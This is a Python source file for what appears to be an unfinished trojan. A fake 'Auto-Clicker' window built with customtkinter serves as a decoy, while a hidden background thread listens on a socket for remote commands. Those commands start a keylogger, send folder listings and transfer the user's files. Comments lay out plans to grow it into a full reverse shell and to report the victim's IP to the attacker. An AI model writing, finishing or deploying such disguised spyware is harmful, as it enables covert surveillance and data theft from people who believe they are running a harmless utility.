import socket
import userscanner
import keylogger
import customtkinter
from threading import Thread
# TODO finish a client command structure
""" 
    This will await commands from the server something like a reverse shell
    When the server sends a show file request this will call the userscanner function
    We can extend this to full on reverse shell in the future

    ALSO:
        OPTIONAL: make a socket that sends the clients ip so the server will know hwo to connect
"""

class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        self.title("Auto-Clicker")
        self.geometry("600x400")

        self.frame1 = customtkinter.CTkFrame(self, width=565, height=180)
        self.frame1.pack(side=customtkinter.TOP, pady=15)
        self.frame1.grid_propagate(False)
        ### Text ###
        self.frametextInfo = customtkinter.CTkLabel(self.frame1, text="Click Interval", text_font="Bold 12")
        self.frametextInfo.pack(side=customtkinter.TOP, pady=10)

        ### Speed Frame
        self.frame_frame1 = customtkinter.CTkFrame(self.frame1, width=565, height=80)
        self.frame_frame1.pack(side=customtkinter.TOP)

        self.frame2 = customtkinter.CTkFrame(self, width=260, height=100)
        self.frame2.pack(side=customtkinter.LEFT, padx=20)
        self.frame2.grid_propagate(False)

        self.frame2textInfo = customtkinter.CTkLabel(self.frame2, text="Click Options", text_font="Bold 12")
        self.frame2textInfo.pack(side=customtkinter.TOP, pady=10)

        self.frame_frame2 = customtkinter.CTkFrame(self.frame2, width=260, height=100)
        self.frame_frame2.pack(side=customtkinter.TOP)



        self.frame3 = customtkinter.CTkFrame(self, width=260, height=100)
        self.frame3.pack(side=customtkinter.RIGHT, padx=20)
        self.frame3.grid_propagate(False)

        self.frame3textInfo = customtkinter.CTkLabel(self.frame3, text="Click Repeat", text_font="Bold 12")
        self.frame3textInfo.pack(side=customtkinter.TOP, pady=10)

        self.frame_frame3 = customtkinter.CTkFrame(self.frame3, width=260, height=100)
        self.frame_frame3.pack(side=customtkinter.TOP)



        self.frame4 = customtkinter.CTkFrame(self, width=565, height=300)
        self.frame4.pack(side=customtkinter.BOTTOM, pady=20)
        self.frame4.grid_propagate(False)

        self.frame4textInfo = customtkinter.CTkLabel(self.frame4, text="Click Repeat", text_font="Bold 12")
        self.frame4textInfo.pack(side=customtkinter.TOP, pady=10)

        self.frame_frame4 = customtkinter.CTkFrame(self.frame4, width=565, height=80)
        self.frame_frame4.pack(side=customtkinter.TOP)

def start_client_server():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
                print("0: client.py started")
                main_s.bind(("127.0.0.1", 12345))
                print("1: bound the ip and port")
                main_s.listen(1)
                print("2: listening")
                conn, addr = main_s.accept()
                print(f"3: accepted {addr}")
                with conn:
                    while True:
                        data = conn.recv(64).decode("utf-8") 
                        # The command section:
                        match data:
                            case "run -keylogger":
                                keylogger.start_keylogger()
                                print("Client Started the keylogger.")
                                data = " "

                            # To je kokotské implementovanie, ale nemusím 500 if dávať
                            case data if "run -gf" == data:
                                userscanner.start_FolderData(data)
                                print("Client Started the Folder Transfer.")
                                data = " "

                            case data if "run -gfc" in data:
                                userscanner.start_sendFiles(data)
                                print("Client Started the FileTransfer.")
                                data = " "

if __name__ == "__main__":
    th1 = Thread(target=start_client_server, daemon=True).start()
    app = App().mainloop()
